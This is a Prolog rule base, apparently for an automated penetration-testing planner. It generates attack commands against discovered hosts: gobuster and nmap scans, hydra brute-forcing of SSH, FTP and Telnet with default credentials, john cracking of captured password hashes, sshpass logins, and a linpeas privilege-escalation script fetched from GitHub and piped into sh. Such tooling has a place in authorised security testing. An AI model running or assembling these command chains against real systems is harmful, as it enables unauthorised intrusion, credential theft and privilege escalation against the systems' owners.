:- discontiguous tool/2.
:- discontiguous profile/2.
:- dynamic executed/2.
:- dynamic connection/1.

tool(gobuster, http_dir_scan_small).
tool(gobuster, https_dir_scan_small).
tool(gobuster, http_dir_scan_big).
tool(gobuster, https_dir_scan_big).

profile(http_dir_scan_small, [ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port]) :- ipv4(Ip, Uri_ipv4), deviceServices(Ip, Port, http), port(Port, Uri_port), http_dir_scan_small([ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port], Command), \+executed(http_dir_scan_small, Command).

profile(https_dir_scan_small, [ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port]) :- ipv4(Ip, Uri_ipv4), deviceServices(Ip, Port, https), port(Port, Uri_port), https_dir_scan_small([ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port], Command), \+executed(https_dir_scan_small, Command).

profile(http_dir_scan_big, [ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port]) :- ipv4(Ip, Uri_ipv4), deviceServices(Ip, Port, http), port(Port, Uri_port), http_dir_scan_big([ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port], Command), \+executed(http_dir_scan_big, Command).

profile(https_dir_scan_big, [ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port]) :- ipv4(Ip, Uri_ipv4), deviceServices(Ip, Port, https), port(Port, Uri_port), https_dir_scan_big([ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port], Command), \+executed(https_dir_scan_big, Command).


http_dir_scan_small(Parameters, Command) :- 
	format_command("gobuster dir -u http://~w:~w/ -w wordlists/common.txt", [Parameters.ipv4, Parameters.port], Command). 

https_dir_scan_small(Parameters, Command) :- 
	format_command("gobuster dir -u https://~w:~w/ -w wordlists/common.txt", [Parameters.ipv4, Parameters.port], Command). 

http_dir_scan_big(Parameters, Command) :- 
	format_command("gobuster dir -u http://~w:~w/ -w wordlists/big.txt", [Parameters.ipv4, Parameters.port], Command). 

https_dir_scan_big(Parameters, Command) :- 
	format_command("gobuster dir -u https://~w:~w/ -w wordlists/big.txt", [Parameters.ipv4, Parameters.port], Command). 

tool(nmap, fast_scan).
tool(nmap, full_scan).

profile(fast_scan, [ipv4=Ip, uri_ipv4=Uri_ipv4]) :- ipv4(Ip, Uri_ipv4), fast_scan([ipv4=Ip, uri_ipv4=Uri_ipv4], Command), \+executed(fast_scan, Command).

profile(full_scan, [ipv4=Ip, uri_ipv4=Uri_ipv4]) :- ipv4(Ip, Uri_ipv4), full_scan([ipv4=Ip, uri_ipv4=Uri_ipv4], Command), \+executed(full_scan, Command).


fast_scan(Parameters, Command) :- 
	format_command("nmap -F ~w", [Parameters.ipv4], Command). 

full_scan(Parameters, Command) :- 
	format_command("nmap -sC -sV -p- ~w", [Parameters.ipv4], Command). 

tool(linpeas, linpeas).

profile(linpeas, []) :- connection(connection), linpeas([], Command), \+executed(linpeas, Command).


linpeas(Parameters, Command) :- 
	format_command("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", [], Command). 

tool(firmwalker, firmware_analysis).

profile(firmware_analysis, [firmware=Firmware, uri_firmware=Uri_firmware]) :- firmware(Firmware, Uri_firmware), firmware_analysis([firmware=Firmware, uri_firmware=Uri_firmware], Command), \+executed(firmware_analysis, Command).


firmware_analysis(Parameters, Command) :- 
	format_command("", [], Command). 

tool(john, crack_hash).

profile(crack_hash, [passwordHash=Hash, uri_passwordHash=Uri_passwordHash]) :- passwordHash(Hash, Uri_passwordHash), crack_hash([passwordHash=Hash, uri_passwordHash=Uri_passwordHash], Command), \+executed(crack_hash, Command).


crack_hash(Parameters, Command) :- 
	format_command("echo <passwordHash> > pass; john pass --wordlist=/usr/share/wordlist/rockyou.txt ;john --show pass", [], Command). 

tool(ssh, ssh_connection).

profile(ssh_connection, [account=Username, uri_account=Uri_account, password=Password, uri_password=Uri_password, ipv4=Ip, uri_ipv4=Uri_ipv4]) :- ipv4(Ip, Uri_ipv4), account(Username, Uri_account), password(Password, Uri_password), ssh_connection([account=Username, uri_account=Uri_account, password=Password, uri_password=Uri_password, ipv4=Ip, uri_ipv4=Uri_ipv4], Command), \+executed(ssh_connection, Command).


ssh_connection(Parameters, Command) :- 
	format_command("sshpass -p ~w ssh ~w@~w", [Parameters.password, Parameters.account, Parameters.ipv4], Command). 

tool(hydra, ssh_attack).
tool(hydra, ftp_attack).
tool(hydra, telnet_attack).

profile(ssh_attack, [ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port]) :- ipv4(Ip, Uri_ipv4), deviceServices(Ip, Port, ssh), port(Port, Uri_port), ssh_attack([ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port], Command), \+executed(ssh_attack, Command).

profile(ftp_attack, [ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port]) :- ipv4(Ip, Uri_ipv4), deviceServices(Ip, Port, ftp), port(Port, Uri_port), ftp_attack([ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port], Command), \+executed(ftp_attack, Command).

profile(telnet_attack, [ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port]) :- ipv4(Ip, Uri_ipv4), deviceServices(Ip, Port, telnet), port(Port, Uri_port), telnet_attack([ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port], Command), \+executed(telnet_attack, Command).


ssh_attack(Parameters, Command) :- 
	format_command("hydra -C wordlists/default_credentials/test.txt ssh://~w:~w", [Parameters.ipv4, Parameters.port], Command). 

ftp_attack(Parameters, Command) :- 
	format_command("hydra -C wordlists/default_credentials/test.txt ftp://~w:~w", [Parameters.ipv4, Parameters.port], Command). 

telnet_attack(Parameters, Command) :- 
	format_command("hydra -C wordlists/default_credentials/test.txt telnet://~w:~w ", [Parameters.ipv4, Parameters.port], Command). 

